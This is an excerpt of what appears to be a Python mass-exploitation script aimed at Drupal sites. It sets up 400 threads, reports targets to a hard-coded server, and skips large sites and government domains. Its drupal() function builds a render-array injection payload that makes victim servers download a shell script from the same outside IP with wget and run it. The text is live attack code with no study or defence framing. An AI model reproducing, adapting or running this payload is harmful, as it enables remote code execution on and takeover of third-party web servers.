...
threadcount = 400
timeout = 30
serverurl = "http://155.94.75.92/y.php"
domain_queue = Queue()
threads = []

def notinbl(qurl):
	bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google', 'wikipedia', 'wikimedia']
	for x in bl:
		if x in qurl:
			return False
	return True
...
def drupal(target):
	try:
		urllib2.urlopen("http://155.94.75.92/e.php?url=" + target, timeout = 25).read()
		payload = "name[%23post_render][]=passthru&name[%23markup]=wget%20-O%20/tmp/a.sh%20http://155.94.75.92/a.sh;%20sh%20/tmp/a.sh&name[%23type]=markup"
